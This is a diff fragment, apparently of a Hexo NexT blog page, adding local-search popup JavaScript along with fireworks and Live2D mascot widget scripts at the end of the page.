+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","bottom":-30,"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
